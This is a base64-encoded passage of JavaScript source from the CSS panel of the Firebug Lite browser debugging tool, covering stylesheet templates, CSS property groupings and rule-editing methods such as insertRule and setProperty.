oqKioqKioqKioqDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCnZhciB0b0NhbWVsQ2FzZSA9IGZ1bmN0aW9uIHRvQ2FtZWxDYXNlKHMpDQp7DQogICAgcmV0dXJuIHMucmVwbGFjZShyZVNlbGVjdG9yQ2FzZSwgdG9DYW1lbENhc2VSZXBsYWNlRm4pOw0KfTsNCg0KdmFyIHRvU2VsZWN0b3JDYXNlID0gZnVuY3Rpb24gdG9TZWxlY3RvckNhc2UocykNCnsNCiAgcmV0dXJuIHMucmVwbGFjZShyZUNhbWVsQ2FzZSwgIi0kMSIpLnRvTG93ZXJDYXNlKCk7DQogIA0KfTsNCg0KdmFyIHJlQ2FtZWxDYXNlID0gLyhbQS1aXSkvZzsNCnZhciByZVNlbGVjdG9yQ2FzZSA9IC9cLSguKS9nOyANCnZhciB0b0NhbWVsQ2FzZVJlcGxhY2VGbiA9IGZ1bmN0aW9uIHRvQ2FtZWxDYXNlUmVwbGFjZUZuKG0sZykNCnsNCiAgICByZXR1cm4gZy50b1VwcGVyQ2FzZSgpOw0KfTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCnZhciBFbGVtZW50Q2FjaGUgPSBGaXJlYnVnLkxpdGUuQ2FjaGUuRWxlbWVudDsNCnZhciBTdHlsZVNoZWV0Q2FjaGUgPSBGaXJlYnVnLkxpdGUuQ2FjaGUuU3R5bGVTaGVldDsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gQ29uc3RhbnRzDQoNCi8vY29uc3QgQ2MgPSBDb21wb25lbnRzLmNsYXNzZXM7DQovL2NvbnN0IENpID0gQ29tcG9uZW50cy5pbnRlcmZhY2VzOw0KLy9jb25zdCBuc0lET01DU1NTdHlsZVJ1bGUgPSBDaS5uc0lET01DU1NTdHlsZVJ1bGU7DQovL2NvbnN0IG5zSUludGVyZmFjZVJlcXVlc3RvciA9IENpLm5zSUludGVyZmFjZVJlcXVlc3RvcjsNCi8vY29uc3QgbnNJU2VsZWN0aW9uRGlzcGxheSA9IENpLm5zSVNlbGVjdGlvbkRpc3BsYXk7DQovL2NvbnN0IG5zSVNlbGVjdGlvbkNvbnRyb2xsZXIgPSBDaS5uc0lTZWxlY3Rpb25Db250cm9sbGVyOw0KDQovLyBTZWU6IGh0dHA6Ly9teHIubW96aWxsYS5vcmcvbW96aWxsYTEuOS4yL3NvdXJjZS9jb250ZW50L2V2ZW50cy9wdWJsaWMvbnNJRXZlbnRTdGF0ZU1hbmFnZXIuaCMxNTMNCi8vY29uc3QgU1RBVEVfQUNUSVZFICA9IDB4MDE7DQovL2NvbnN0IFNUQVRFX0ZPQ1VTICAgPSAweDAyOw0KLy9jb25zdCBTVEFURV9IT1ZFUiAgID0gMHgwNDsNCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCi8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCkZpcmVidWcuU291cmNlQm94UGFuZWwgPSBGaXJlYnVnLlBhbmVsOw0KDQp2YXIgcmVTZWxlY3RvclRhZyA9IC8oXnxccykoPzpcdyspL2c7DQoNCnZhciBkb21VdGlscyA9IG51bGw7DQoNCnZhciB0ZXh0Q29udGVudCA9IGlzSUUgPyAiaW5uZXJUZXh0IiA6ICJ0ZXh0Q29udGVudCI7DQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCi8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQp2YXIgQ1NTRG9tcGxhdGVCYXNlID0gew0KICAgIGlzRWRpdGFibGU6IGZ1bmN0aW9uKHJ1bGUpDQogICAgew0KICAgICAgICByZXR1cm4gIXJ1bGUuaXNTeXN0ZW1TaGVldDsNCiAgICB9LA0KICAgIGlzU2VsZWN0b3JFZGl0YWJsZTogZnVuY3Rpb24ocnVsZSkNCiAgICB7DQogICAgICAgIHJldHVybiBydWxlLmlzU2VsZWN0b3JFZGl0YWJsZSAmJiB0aGlzLmlzRWRpdGFibGUocnVsZSk7DQogICAgfQ0KfTsNCg0KdmFyIENTU1Byb3BUYWcgPSBkb21wbGF0ZShDU1NEb21wbGF0ZUJhc2UsIHsNCiAgICB0YWc6IERJVih7ImNsYXNzIjogImNzc1Byb3AgZm9jdXNSb3ciLCAkZGlzYWJsZWRTdHlsZTogIiRwcm9wLmRpc2FibGVkIiwNCiAgICAgICAgICAkZWRpdEdyb3VwOiAiJHJ1bGV8aXNFZGl0YWJsZSIsDQogICAgICAgICAgJGNzc092ZXJyaWRkZW46ICIkcHJvcC5vdmVycmlkZGVuIiwgcm9sZSA6ICJvcHRpb24ifSwNCiAgICAgICAgQSh7ImNsYXNzIjogImNzc1Byb3BEaXNhYmxlIn0sICImbmJzcDsmbmJzcDsiKSwNCiAgICAgICAgU1BBTih7ImNsYXNzIjogImNzc1Byb3BOYW1lIiwgJGVkaXRhYmxlOiAiJHJ1bGV8aXNFZGl0YWJsZSJ9LCAiJHByb3AubmFtZSIpLA0KICAgICAgICBTUEFOKHsiY2xhc3MiOiAiY3NzQ29sb24ifSwgIjoiKSwNCiAgICAgICAgU1BBTih7ImNsYXNzIjogImNzc1Byb3BWYWx1ZSIsICRlZGl0YWJsZTogIiRydWxlfGlzRWRpdGFibGUifSwgIiRwcm9wLnZhbHVlJHByb3AuaW1wb3J0YW50IiksDQogICAgICAgIFNQQU4oeyJjbGFzcyI6ICJjc3NTZW1pIn0sICI7IikNCiAgICApDQp9KTsNCg0KdmFyIENTU1J1bGVUYWcgPQ0KICAgIFRBRygiJHJ1bGUudGFnIiwge3J1bGU6ICIkcnVsZSJ9KTsNCg0KdmFyIENTU0ltcG9ydFJ1bGVUYWcgPSBkb21wbGF0ZSh7DQogICAgdGFnOiBESVYoeyJjbGFzcyI6ICJjc3NSdWxlIGluc2VydEludG8gZm9jdXNSb3cgaW1wb3J0UnVsZSIsIF9yZXBPYmplY3Q6ICIkcnVsZS5ydWxlIn0sDQogICAgICAgICJAaW1wb3J0ICZxdW90OyIsDQogICAgICAgIEEoeyJjbGFzcyI6ICJvYmplY3RMaW5rIiwgX3JlcE9iamVjdDogIiRydWxlLnJ1bGUuc3R5bGVTaGVldCJ9LCAiJHJ1bGUucnVsZS5ocmVmIiksDQogICAgICAgICImcXVvdDs7Ig0KICAgICkNCn0pOw0KDQp2YXIgQ1NTU3R5bGVSdWxlVGFnID0gZG9tcGxhdGUoQ1NTRG9tcGxhdGVCYXNlLCB7DQogICAgdGFnOiBESVYoeyJjbGFzcyI6ICJjc3NSdWxlIGluc2VydEludG8iLA0KICAgICAgICAgICAgJGNzc0VkaXRhYmxlUnVsZTogIiRydWxlfGlzRWRpdGFibGUiLA0KICAgICAgICAgICAgJGVkaXRHcm91cDogIiRydWxlfGlzU2VsZWN0b3JFZGl0YWJsZSIsDQogICAgICAgICAgICBfcmVwT2JqZWN0OiAiJHJ1bGUucnVsZSIsDQogICAgICAgICAgICAicnVsZUlkIjogIiRydWxlLmlkIiwgcm9sZSA6ICdwcmVzZW50YXRpb24nfSwNCiAgICAgICAgRElWKHsiY2xhc3MiOiAiY3NzSGVhZCBmb2N1c1JvdyIsIHJvbGUgOiAnbGlzdGl0ZW0nfSwNCiAgICAgICAgICAgIFNQQU4oeyJjbGFzcyI6ICJjc3NTZWxlY3RvciIsICRlZGl0YWJsZTogIiRydWxlfGlzU2VsZWN0b3JFZGl0YWJsZSJ9LCAiJHJ1bGUuc2VsZWN0b3IiKSwgIiB7Ig0KICAgICAgICApLA0KICAgICAgICBESVYoe3JvbGUgOiAnZ3JvdXAnfSwNCiAgICAgICAgICAgIERJVih7ImNsYXNzIjogImNzc1Byb3BlcnR5TGlzdEJveCIsIHJvbGUgOiAnbGlzdGJveCd9LA0KICAgICAgICAgICAgICAgIEZPUigicHJvcCIsICIkcnVsZS5wcm9wcyIsDQogICAgICAgICAgICAgICAgICAgIFRBRyhDU1NQcm9wVGFnLnRhZywge3J1bGU6ICIkcnVsZSIsIHByb3A6ICIkcHJvcCJ9KQ0KICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICkNCiAgICAgICAgKSwNCiAgICAgICAgRElWKHsiY2xhc3MiOiAiZWRpdGFibGUgaW5zZXJ0QmVmb3JlIiwgcm9sZToicHJlc2VudGF0aW9uIn0sICJ9IikNCiAgICApDQp9KTsNCg0KdmFyIHJlU3BsaXRDU1MgPSAgLyh1cmxcKCI/W14iXCldKz8iP1wpKXwocmdiXCguKj9cKSl8KCNbXGRBLUZhLWZdKyl8KC0/XGQrKFwuXGQrKT8oJXxbYS16XXsxLDJ9KT8pfChbXixcc10rKXwiKC4qPykiLzsNCg0KdmFyIHJlVVJMID0gL3VybFwoIj8oW14iXCldKyk/Ij9cKS87DQoNCnZhciByZVJlcGVhdCA9IC9uby1yZXBlYXR8cmVwZWF0LXh8cmVwZWF0LXl8cmVwZWF0LzsNCg0KLy9jb25zdCBzb3RoaW5rSW5zdGFsbGVkID0gISEkKCJzd2ZjYXRjaGVyS2V5X3NpZGViYXIiKTsNCnZhciBzb3RoaW5rSW5zdGFsbGVkID0gZmFsc2U7DQp2YXIgc3R5bGVHcm91cHMgPQ0Kew0KICAgIHRleHQ6IFsNCiAgICAgICAgImZvbnQtZmFtaWx5IiwNCiAgICAgICAgImZvbnQtc2l6ZSIsDQogICAgICAgICJmb250LXdlaWdodCIsDQogICAgICAgICJmb250LXN0eWxlIiwNCiAgICAgICAgImNvbG9yIiwNCiAgICAgICAgInRleHQtdHJhbnNmb3JtIiwNCiAgICAgICAgInRleHQtZGVjb3JhdGlvbiIsDQogICAgICAgICJsZXR0ZXItc3BhY2luZyIsDQogICAgICAgICJ3b3JkLXNwYWNpbmciLA0KICAgICAgICAibGluZS1oZWlnaHQiLA0KICAgICAgICAidGV4dC1hbGlnbiIsDQogICAgICAgICJ2ZXJ0aWNhbC1hbGlnbiIsDQogICAgICAgICJkaXJlY3Rpb24iLA0KICAgICAgICAiY29sdW1uLWNvdW50IiwNCiAgICAgICAgImNvbHVtbi1nYXAiLA0KICAgICAgICAiY29sdW1uLXdpZHRoIg0KICAgIF0sDQoNCiAgICBiYWNrZ3JvdW5kOiBbDQogICAgICAgICJiYWNrZ3JvdW5kLWNvbG9yIiwNCiAgICAgICAgImJhY2tncm91bmQtaW1hZ2UiLA0KICAgICAgICAiYmFja2dyb3VuZC1yZXBlYXQiLA0KICAgICAgICAiYmFja2dyb3VuZC1wb3NpdGlvbiIsDQogICAgICAgICJiYWNrZ3JvdW5kLWF0dGFjaG1lbnQiLA0KICAgICAgICAib3BhY2l0eSINCiAgICBdLA0KDQogICAgYm94OiBbDQogICAgICAgICJ3aWR0aCIsDQogICAgICAgICJoZWlnaHQiLA0KICAgICAgICAidG9wIiwNCiAgICAgICAgInJpZ2h0IiwNCiAgICAgICAgImJvdHRvbSIsDQogICAgICAgICJsZWZ0IiwNCiAgICAgICAgIm1hcmdpbi10b3AiLA0KICAgICAgICAibWFyZ2luLXJpZ2h0IiwNCiAgICAgICAgIm1hcmdpbi1ib3R0b20iLA0KICAgICAgICAibWFyZ2luLWxlZnQiLA0KICAgICAgICAicGFkZGluZy10b3AiLA0KICAgICAgICAicGFkZGluZy1yaWdodCIsDQogICAgICAgICJwYWRkaW5nLWJvdHRvbSIsDQogICAgICAgICJwYWRkaW5nLWxlZnQiLA0KICAgICAgICAiYm9yZGVyLXRvcC13aWR0aCIsDQogICAgICAgICJib3JkZXItcmlnaHQtd2lkdGgiLA0KICAgICAgICAiYm9yZGVyLWJvdHRvbS13aWR0aCIsDQogICAgICAgICJib3JkZXItbGVmdC13aWR0aCIsDQogICAgICAgICJib3JkZXItdG9wLWNvbG9yIiwNCiAgICAgICAgImJvcmRlci1yaWdodC1jb2xvciIsDQogICAgICAgICJib3JkZXItYm90dG9tLWNvbG9yIiwNCiAgICAgICAgImJvcmRlci1sZWZ0LWNvbG9yIiwNCiAgICAgICAgImJvcmRlci10b3Atc3R5bGUiLA0KICAgICAgICAiYm9yZGVyLXJpZ2h0LXN0eWxlIiwNCiAgICAgICAgImJvcmRlci1ib3R0b20tc3R5bGUiLA0KICAgICAgICAiYm9yZGVyLWxlZnQtc3R5bGUiLA0KICAgICAgICAiLW1vei1ib3JkZXItdG9wLXJhZGl1cyIsDQogICAgICAgICItbW96LWJvcmRlci1yaWdodC1yYWRpdXMiLA0KICAgICAgICAiLW1vei1ib3JkZXItYm90dG9tLXJhZGl1cyIsDQogICAgICAgICItbW96LWJvcmRlci1sZWZ0LXJhZGl1cyIsDQogICAgICAgICJvdXRsaW5lLXRvcC13aWR0aCIsDQogICAgICAgICJvdXRsaW5lLXJpZ2h0LXdpZHRoIiwNCiAgICAgICAgIm91dGxpbmUtYm90dG9tLXdpZHRoIiwNCiAgICAgICAgIm91dGxpbmUtbGVmdC13aWR0aCIsDQogICAgICAgICJvdXRsaW5lLXRvcC1jb2xvciIsDQogICAgICAgICJvdXRsaW5lLXJpZ2h0LWNvbG9yIiwNCiAgICAgICAgIm91dGxpbmUtYm90dG9tLWNvbG9yIiwNCiAgICAgICAgIm91dGxpbmUtbGVmdC1jb2xvciIsDQogICAgICAgICJvdXRsaW5lLXRvcC1zdHlsZSIsDQogICAgICAgICJvdXRsaW5lLXJpZ2h0LXN0eWxlIiwNCiAgICAgICAgIm91dGxpbmUtYm90dG9tLXN0eWxlIiwNCiAgICAgICAgIm91dGxpbmUtbGVmdC1zdHlsZSINCiAgICBdLA0KDQogICAgbGF5b3V0OiBbDQogICAgICAgICJwb3NpdGlvbiIsDQogICAgICAgICJkaXNwbGF5IiwNCiAgICAgICAgInZpc2liaWxpdHkiLA0KICAgICAgICAiei1pbmRleCIsDQogICAgICAgICJvdmVyZmxvdy14IiwgIC8vIGh0dHA6Ly93d3cudzMub3JnL1RSLzIwMDIvV0QtY3NzMy1ib3gtMjAwMjEwMjQvI292ZXJmbG93DQogICAgICAgICJvdmVyZmxvdy15IiwNCiAgICAgICAgIm92ZXJmbG93LWNsaXAiLA0KICAgICAgICAid2hpdGUtc3BhY2UiLA0KICAgICAgICAiY2xpcCIsDQogICAgICAgICJmbG9hdCIsDQogICAgICAgICJjbGVhciIsDQogICAgICAgICItbW96LWJveC1zaXppbmciDQogICAgXSwNCg0KICAgIG90aGVyOiBbDQogICAgICAgICJjdXJzb3IiLA0KICAgICAgICAibGlzdC1zdHlsZS1pbWFnZSIsDQogICAgICAgICJsaXN0LXN0eWxlLXBvc2l0aW9uIiwNCiAgICAgICAgImxpc3Qtc3R5bGUtdHlwZSIsDQogICAgICAgICJtYXJrZXItb2Zmc2V0IiwNCiAgICAgICAgInVzZXItZm9jdXMiLA0KICAgICAgICAidXNlci1zZWxlY3QiLA0KICAgICAgICAidXNlci1tb2RpZnkiLA0KICAgICAgICAidXNlci1pbnB1dCINCiAgICBdDQp9Ow0KDQp2YXIgc3R5bGVHcm91cFRpdGxlcyA9DQp7DQogICAgdGV4dDogIlRleHQiLA0KICAgIGJhY2tncm91bmQ6ICJCYWNrZ3JvdW5kIiwNCiAgICBib3g6ICJCb3ggTW9kZWwiLA0KICAgIGxheW91dDogIkxheW91dCIsDQogICAgb3RoZXI6ICJPdGhlciINCn07DQoNCkZpcmVidWcuQ1NTTW9kdWxlID0gZXh0ZW5kKEZpcmVidWcuTW9kdWxlLA0Kew0KICAgIGZyZWVFZGl0OiBmdW5jdGlvbihzdHlsZVNoZWV0LCB2YWx1ZSkNCiAgICB7DQogICAgICAgIGlmICghc3R5bGVTaGVldC5lZGl0U3R5bGVTaGVldCkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIG93bmVyTm9kZSA9IGdldFN0eWxlU2hlZXRPd25lck5vZGUoc3R5bGVTaGVldCk7DQogICAgICAgICAgICBzdHlsZVNoZWV0LmRpc2FibGVkID0gdHJ1ZTsNCg0KICAgICAgICAgICAgdmFyIHVybCA9IENDU1YoIkBtb3ppbGxhLm9yZy9uZXR3b3JrL3N0YW5kYXJkLXVybDsxIiwgQ29tcG9uZW50cy5pbnRlcmZhY2VzLm5zSVVSTCk7DQogICAgICAgICAgICB1cmwuc3BlYyA9IHN0eWxlU2hlZXQuaHJlZjsNCg0KICAgICAgICAgICAgdmFyIGVkaXRTdHlsZVNoZWV0ID0gb3duZXJOb2RlLm93bmVyRG9jdW1lbnQuY3JlYXRlRWxlbWVudE5TKA0KICAgICAgICAgICAgICAgICJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiwNCiAgICAgICAgICAgICAgICAic3R5bGUiKTsNCiAgICAgICAgICAgIHVud3JhcE9iamVjdChlZGl0U3R5bGVTaGVldCkuZmlyZWJ1Z0lnbm9yZSA9IHRydWU7DQogICAgICAgICAgICBlZGl0U3R5bGVTaGVldC5zZXRBdHRyaWJ1dGUoInR5cGUiLCAidGV4dC9jc3MiKTsNCiAgICAgICAgICAgIGVkaXRTdHlsZVNoZWV0LnNldEF0dHJpYnV0ZU5TKA0KICAgICAgICAgICAgICAgICJodHRwOi8vd3d3LnczLm9yZy9YTUwvMTk5OC9uYW1lc3BhY2UiLA0KICAgICAgICAgICAgICAgICJiYXNlIiwNCiAgICAgICAgICAgICAgICB1cmwuZGlyZWN0b3J5KTsNCiAgICAgICAgICAgIGlmIChvd25lck5vZGUuaGFzQXR0cmlidXRlKCJtZWRpYSIpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICBlZGl0U3R5bGVTaGVldC5zZXRBdHRyaWJ1dGUoIm1lZGlhIiwgb3duZXJOb2RlLmdldEF0dHJpYnV0ZSgibWVkaWEiKSk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC8vIEluc2VydCB0aGUgZWRpdGVkIHN0eWxlc2hlZXQgZGlyZWN0bHkgYWZ0ZXIgdGhlIG9sZCBvbmUgdG8gZW5zdXJlIHRoZSBzdHlsZXMNCiAgICAgICAgICAgIC8vIGNhc2NhZGUgcHJvcGVybHkuDQogICAgICAgICAgICBvd25lck5vZGUucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUoZWRpdFN0eWxlU2hlZXQsIG93bmVyTm9kZS5uZXh0U2libGluZyk7DQoNCiAgICAgICAgICAgIHN0eWxlU2hlZXQuZWRpdFN0eWxlU2hlZXQgPSBlZGl0U3R5bGVTaGVldDsNCiAgICAgICAgfQ0KDQogICAgICAgIHN0eWxlU2hlZXQuZWRpdFN0eWxlU2hlZXQuaW5uZXJIVE1MID0gdmFsdWU7DQogICAgICAgIGlmIChGQlRyYWNlLkRCR19DU1MpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiY3NzLnNhdmVFZGl0IHN0eWxlU2hlZXQuaHJlZjoiK3N0eWxlU2hlZXQuaHJlZisiIGdvdCBpbm5lckhUTUw6Iit2YWx1ZSsiXG4iKTsNCg0KICAgICAgICBkaXNwYXRjaCh0aGlzLmZiTGlzdGVuZXJzLCAib25DU1NGcmVlRWRpdCIsIFtzdHlsZVNoZWV0LCB2YWx1ZV0pOw0KICAgIH0sDQoNCiAgICBpbnNlcnRSdWxlOiBmdW5jdGlvbihzdHlsZVNoZWV0LCBjc3NUZXh0LCBydWxlSW5kZXgpDQogICAgew0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfQ1NTKSBGQlRyYWNlLnN5c291dCgiSW5zZXJ0OiAiICsgcnVsZUluZGV4ICsgIiAiICsgY3NzVGV4dCk7DQogICAgICAgIHZhciBpbnNlcnRJbmRleCA9IHN0eWxlU2hlZXQuaW5zZXJ0UnVsZShjc3NUZXh0LCBydWxlSW5kZXgpOw0KDQogICAgICAgIGRpc3BhdGNoKHRoaXMuZmJMaXN0ZW5lcnMsICJvbkNTU0luc2VydFJ1bGUiLCBbc3R5bGVTaGVldCwgY3NzVGV4dCwgcnVsZUluZGV4XSk7DQoNCiAgICAgICAgcmV0dXJuIGluc2VydEluZGV4Ow0KICAgIH0sDQoNCiAgICBkZWxldGVSdWxlOiBmdW5jdGlvbihzdHlsZVNoZWV0LCBydWxlSW5kZXgpDQogICAgew0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfQ1NTKSBGQlRyYWNlLnN5c291dCgiZGVsZXRlUnVsZTogIiArIHJ1bGVJbmRleCArICIgIiArIHN0eWxlU2hlZXQuY3NzUnVsZXMubGVuZ3RoLCBzdHlsZVNoZWV0LmNzc1J1bGVzKTsNCiAgICAgICAgZGlzcGF0Y2godGhpcy5mYkxpc3RlbmVycywgIm9uQ1NTRGVsZXRlUnVsZSIsIFtzdHlsZVNoZWV0LCBydWxlSW5kZXhdKTsNCg0KICAgICAgICBzdHlsZVNoZWV0LmRlbGV0ZVJ1bGUocnVsZUluZGV4KTsNCiAgICB9LA0KDQogICAgc2V0UHJvcGVydHk6IGZ1bmN0aW9uKHJ1bGUsIHByb3BOYW1lLCBwcm9wVmFsdWUsIHByb3BQcmlvcml0eSkNCiAgICB7DQogICAgICAgIHZhciBzdHlsZSA9IHJ1bGUuc3R5bGUgfHwgcnVsZTsNCg0KICAgICAgICAvLyBSZWNvcmQgdGhlIG9yaWdpbmFsIENTUyB0ZXh0IGZvciB0aGUgaW5saW5lIGNhc2Ugc28gd2UgY2FuIHJlY29uc3RydWN0IGF0IGEgbGF0ZXINCiAgICAgICAgLy8gcG9pbnQgZm9yIGRpZmZpbmcgcHVycG9zZXMNCiAgICAgICAgdmFyIGJhc2VUZXh0ID0gc3R5bGUuY3NzVGV4dDsNCiAgICAgICAgDQogICAgICAgIC8vIGdvb2QgYnJvd3NlcnMNCiAgICAgICAgaWYgKHN0eWxlLmdldFByb3BlcnR5VmFsdWUpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBwcmV2VmFsdWUgPSBzdHlsZS5nZXRQcm9wZXJ0eVZhbHVlKHByb3BOYW1lKTsNCiAgICAgICAgICAgIHZhciBwcmV2UHJpb3JpdHkgPSBzdHlsZS5nZXRQcm9wZXJ0eVByaW9yaXR5KHByb3BOYW1lKTsNCiAgICANCiAgICAgICAgICAgIC8vIFhYWGpvZSBHZWNrbyBidWcgd29ya2Fyb3VuZDogSnVzdCBjaGFuZ2luZyBwcmlvcml0eSBkb2Vzbid0IGhhdmUgYW55IGVmZmVjdA0KICAgICAgICAgICAgLy8gdW5sZXNzIHdlIHJlbW92ZSB0aGUgcHJvcGVydHkgZmlyc3QNCiAgICAgICAgICAgIHN0eWxlLnJlbW92ZVByb3BlcnR5KHByb3BOYW1lKTsNCiAgICANCiAgICAgICAgICAgIHN0eWxlLnNldFByb3BlcnR5KHByb3BOYW1lLCBwcm9wVmFsdWUsIHByb3BQcmlvcml0eSk7DQogICAgICAgIH0NCiAgICAgICAgLy8gc2FkIGJyb3dzZXJzDQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gcGFyc2UgQ1NTIHJ1bGUgdG8gZmluZCBwcm9wZXJ0eSBwcmlvcml0eSBpbiBJRT8NCiAgICAgICAgICAgIC8vY29uc29sZS5sb2cocHJvcE5hbWUsIHByb3BWYWx1ZSk7DQogICAgICAgICAgICBzdHlsZVt0b0NhbWVsQ2FzZShwcm9wTmFtZSldID0gcHJvcFZhbHVlOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKHByb3BOYW1lKSB7DQogICAgICAgICAgICBkaXNwYXRjaCh0aGlzLmZiTGlzdGVuZXJzLCAib25DU1NTZXRQcm9wZXJ0eSIsIFtzdHlsZSwgcHJvcE5hbWUsIHByb3BWYWx1ZSwgcHJvcFByaW9yaXR5LCBwcmV2VmFsdWUsIHByZXZQcmlvcml0eSwgcnVsZSwgYmFzZVRleHRdKTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICByZW1vdmVQcm9wZXJ0eTogZnVuY3Rpb24ocnVsZSwgcHJvcE5hbWUsIHBhcmVudCkNCiAgICB7DQogICAgICAgIHZhciBzdHlsZSA9IHJ1bGUuc3R5bGUgfHwgcnVsZTsNCg0KICAgICAgICAvLyBSZWNvcmQgdGhlIG9yaWdpbmFsIENTUyB0ZXh0IGZvciB0aGUgaW5saW5lIGNhc2Ugc28gd2UgY2FuIHJlY29uc3RydWN0IGF0IGEgbGF0ZXINCiAgICAgICAgLy8gcG9pbnQgZm9yIGRpZmZpbmcgcHVycG9zZXMNCiAgICAgICAgdmFyIGJhc2VUZXh0ID0gc3R5bGUuY3NzVGV4dDsNCiAgICAgICAgDQogICAgICAgIGlmIChzdHlsZS5nZXRQcm9wZXJ0eVZhbHVlKQ0KICAgICAgICB7DQogICAgDQogICAgICAgICAgICB2YXIgcHJldlZhbHVlID0gc3R5bGUuZ2V0UHJvcGVydHlWYWx1ZShwcm9wTmFtZSk7DQogICAgICAgICAgICB2YXIgcHJldlByaW9yaXR5ID0gc3R5bGUuZ2V0UHJvcGVydHlQcmlvcml0eShwcm9wTmFtZSk7DQogICAgDQogICAgICAgICAgICBzdHlsZS5yZW1vdmVQcm9wZXJ0eShwcm9wTmFtZSk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICBzdHlsZVt0b0NhbWVsQ2FzZShwcm9wTmFtZSldID0gIiI7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAocHJvcE5hbWUpIHsNCiAgICAgICAgICAgIGRpc3BhdGNoKHRoaXMuZmJMaXN0ZW5lcnMsICJvbkNTU1JlbW92ZVByb3BlcnR5IiwgW3N0eWxlLCBwcm9wTmFtZSwgcHJldlZhbHVlLCBwcmV2UHJpb3JpdHksIHJ1bGUsIGJhc2VUZXh0XSk7DQogICAgICAgIH0NCiAgICB9LyosDQoNCiAgICBjbGVhbnVwU2hlZXRzOiBmdW5jdGlvbihkb2MsIGNvbnRleHQpDQogICAgew0KICAgICAgICAvLyBEdWUgdG8gdGhlIG1hbm5lciBpbiB3aGljaCB0aGUgbGF5b3V0IGVuZ2luZSBoYW5kbGVzIG11bHRpcGxlDQogICAgICAgIC8vIHJlZmVyZW5jZXMgdG8gdGhlIHNhbWUgc2hlZXQgd2UgbmVlZCB0byBraWNrIGl0IGEgbGl0dGxlIGJpdC4NCiAgICAgICAgLy8gVGhlIGluamVjdGluZyBhIHNpbXBsZSBzdHlsZXNoZWV0IHRoZW4gcmVtb3ZpbmcgaXQgd2lsbCBmb3JjZQ0KICAgICAgICAvLyBGaXJl